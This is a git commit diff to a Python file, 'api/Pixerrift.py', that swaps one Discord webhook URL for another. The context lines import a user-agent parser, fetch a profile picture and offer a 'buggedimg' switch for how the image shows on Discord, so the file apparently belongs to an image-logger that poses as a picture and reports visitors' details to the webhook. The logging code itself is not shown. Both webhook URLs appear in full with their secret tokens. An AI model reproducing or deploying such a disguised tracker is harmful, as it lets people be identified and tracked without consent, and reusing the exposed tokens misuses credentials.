01ab1bd4fe187b338c7e4692e293261d53bb3071
taimxvz-blip <taimxvz@gmail.com>
2026-03-28 22:54:59 -0400

    Update Discord webhook URL in Pixerrift.py

--- api/Pixerrift.py
+++ api/Pixerrift.py
@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1480000064956141712/QVBAPfYEp6BY4QGezk1zIkC-cpB0VdeKCNDsOgBOJnKOB9T8ppPUqOwnU5AMGVE3OWt2'
+webhook = 'https://discord.com/api/webhooks/1487644510467915897/IYvDCfFJ27o7A5q36hwRf2Q8Qfope2U_rh_C3y4wpxO97eD0ZKoyWNdmrRsWC4TiC3bd'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
